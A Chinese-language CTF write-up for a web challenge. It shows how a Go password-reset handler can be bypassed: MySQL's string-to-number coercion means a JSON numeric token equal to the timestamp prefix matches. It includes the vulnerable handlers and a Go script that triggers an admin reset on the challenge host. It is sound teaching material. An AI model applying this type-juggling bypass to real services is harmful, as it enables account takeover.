# video 的解题思路

## 题目信息

| 题目名 | 类型 | 难度 |
| ------ | ---- | ---- |
| video  | WEB  | 中等 |

## FLAG

* 动态flag



## 知识点

1. WEB-MYSQL-弱类型特性
2. WEB-Golang-代码审计
3. WEB-密码重置绕过



## 解题步骤

### 1.功能分析

重置密码部分分为两步

第一步是 输入用户名获取重置Token

第二步是 利用获取的Token重置密码

![img](https://c.img.dasctf.com/LightPicture/2025/10/12acccd872c724fc.png)

### 2.重置Token路由

查看重置Token路由的代码

```go
func PostResetrequest(c *gin.Context) {
        user := c.PostForm("username")
        // 判断一下 Reset Token 是否存在
        var token string
        err := db.Raw("SELECT token FROM resetpasswords WHERE username=?", user).Scan(&token).Error
        if err != nil {
                fmt.Println(err)
                c.String(400, "用户不存在")
                return
        }
        token = ""
        token = strconv.FormatInt(time.Now().Unix(), 10) + "-" + uuid.New().String()
        fmt.Println("user", user)
        err = db.Exec("UPDATE resetpasswords SET token=? WHERE username=?", token, user).Error
        if err != nil {
                fmt.Println(err)
        }
        fmt.Println("token:", token)
        c.String(200, "成功发送重置密码Token")
}
```

token的生成规则是 `时间戳` + `"-"` + `"uuid()"`

然后将生成的Token插入到数据库中

但是并没有将Token返回给我们`(fmt.Println("token:", token) 只是将token打印到控制台)`

### 3.重置密码路由

再看重置密码路由代码

```go
func PostResetconfirm(c *gin.Context) {
        var data map[string]interface{}
        if err := c.ShouldBindJSON(&data); err != nil {
                c.String(400, "无效的 JSON")
                return
        }

        username, _ := data["username"].(string)
        newPassword, _ := data["newPassword"].(string)

        token, ok := data["token"]

        if !ok {
                c.String(400, "缺少 token 字段")
                return
        }
        fmt.Printf("username = > %T,token = > %T,newpasswd = > %T\n", username, token, newPassword)
        fmt.Println(username, token, newPassword)
        var re string
        db.Raw("SELECT username from resetpasswords where token=?", token).Scan(&re)
        if re == username {
                db.Exec("UPDATE userinfos SET password=? WHERE username=?", newPassword, username)
                c.String(200, "密码重置成功!")
                return
        } else {
                c.String(400, "token错误")

        }
}
```

后端用data来接收Json传入的数据

键是string类型 值是interface{}类型

> 在 Go 里，`interface{}` 表示**空接口**，它可以存放任意类型的值（`string`、`int`、`float64`、结构体等都行）。

然后再从data中提取出`usernmae` `newpassword` `token` 然后将其赋值给相应的变量中

在赋值的过程中 使用`:=`进行赋值

> `:=`在`Go`中声明新变量，并用右侧的值进行初始化，同时自动推导变量类型。 类似python

然后以`db.Raw("SELECT username from resetpasswords where token=?", token).Scan(&re)`来判断token的正确性

https://dev.mysql.com/doc/refman/8.4/en/type-conversion.html

在mysql中如果字符串与数字进行比较的话 如果字符串前几位数字是数字，则会将几位数字与其进行比较

```sql
mysql> select "123456asdas" = 123456;
+------------------------+
| "123456asdas" = 123456 |
+------------------------+
|                      1 |
+------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> select "123456asdas" = "123456";
+--------------------------+
| "123456asdas" = "123456" |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (0.00 sec)

mysql> select "123456asdas" = 23456;
+-----------------------+
| "123456asdas" = 23456 |
+-----------------------+
|                     0 |
+-----------------------+
1 row in set, 1 warning (0.00 sec)
```

![img](https://c.img.dasctf.com/LightPicture/2025/10/7cb0c1dc5ec692a9.png)



当执行`select "123456asdas" = 123456;`的时候返回为true

什么？

你说你看不懂？

那你看看下面的php代码或许也能理解

```go
<?php
show_source(__FILE__);
$a = $_GET['a'];
if (!is_numeric($a)) {
    if ($a == 1000) {
        echo "you are right";
    }
}
```

![img](https://c.img.dasctf.com/LightPicture/2025/10/8854b62ba40e62b4.png)

### 4.getflag

刚才提到了token的生成规则是 `时间戳` + `"-"` + `"uuid()"` 时间戳是纯数字 后面的是字符

所以写一个脚本记录一下 获取Token 的时间戳就行了

```Go
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func main() {
	client := &http.Client{}

	// 构造表单数据
	form := url.Values{}
	form.Add("username", "admin")

	// 发送 POST 请求
	resp, err := client.Post(
		"http://185.216.119.217:9090/resetrequest",
		"application/x-www-form-urlencoded",
		strings.NewReader(form.Encode()),
	)
	timeU := time.Now().Unix()
	if err != nil {
		fmt.Println("请求失败:", err)
		return
	}
	defer resp.Body.Close()

	// 读取响应内容
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}

	fmt.Println("响应内容:")
	fmt.Println(string(body))
	fmt.Println("时间戳: ====> ", timeU)
}

```

![image-20251009102942422](https://c.img.dasctf.com/LightPicture/2025/10/310bc2a6471ae501.png)

直接填入token发包是json默认发字符串类型的数据

![image-20251009103048996](https://c.img.dasctf.com/LightPicture/2025/10/a166fd63b6601883.png)



将token的`""`删去 传输入数字类型的数据

本地获取的时间戳与远程获取的可能会有大`1~2`秒或者小`1~2`秒的误差

我这里出现了1s的误差 将80改为79成功重置admin的密码

![image-20251009103003567](https://c.img.dasctf.com/LightPicture/2025/10/441d309348e1e1d9.png)

然后使用`admin/admin`就能给成功登录admin

然后getflag

![image-20251009105225090](https://c.img.dasctf.com/LightPicture/2025/10/cb2494f15a1443c5.png)